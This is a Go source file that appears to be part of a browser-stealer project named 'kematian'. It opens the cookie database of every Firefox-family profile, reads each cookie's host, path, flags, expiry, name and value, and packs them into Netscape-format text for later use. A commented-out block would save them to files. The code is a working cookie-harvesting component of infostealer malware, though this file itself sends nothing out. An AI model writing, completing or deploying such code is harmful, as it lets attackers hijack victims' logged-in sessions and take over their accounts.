package cookiesGecko

import (
	"database/sql"

	"kdot/kematian/browsers/structs"
)

func GetCookies(browsersList []structs.Browser) []structs.CookiesOutput {
	var cookies []structs.CookiesOutput
	for _, browser := range browsersList {
		if browser.IsChromium {
			continue
		}
		var CookiesFound = ""
		for _, profile := range browser.Profiles {
			path := profile.Cookies

			db, err := sql.Open("sqlite3", path)
			if err != nil {
				continue
			}
			defer db.Close()

			row, err := db.Query("SELECT host, path, isHttpOnly, expiry, name, value FROM moz_cookies")
			if err != nil {
				continue
			}
			defer row.Close()

			for row.Next() {
				var host string
				var path string
				var isHttpOnly string
				var expiry string
				var name string
				var value string
				row.Scan(&host, &path, &isHttpOnly, &expiry, &name, &value)
				httpfrfr := "TRUE"
				if isHttpOnly == "0" {
					httpfrfr = "FALSE"
				}
				tf_other := "TRUE"
				if host[0] == '.' {
					tf_other = "FALSE"
				}
				CookiesFound = CookiesFound + host + "\t" + tf_other + "\t" + path + "\t" + httpfrfr + "\t" + expiry + "\t" + name + "\t" + value + "\n"
			}
		}
		cookies = append(cookies, structs.CookiesOutput{BrowserName: browser.ProfilePath, Cookies: CookiesFound})
	}
	//for _, cookie := range cookies {
	//	fileName := "cookies_netscape_" + cookie.browserName + ".txt"
	//	os.WriteFile(fileName, []byte(cookie.cookies), 0644)
	//}
	return cookies
}
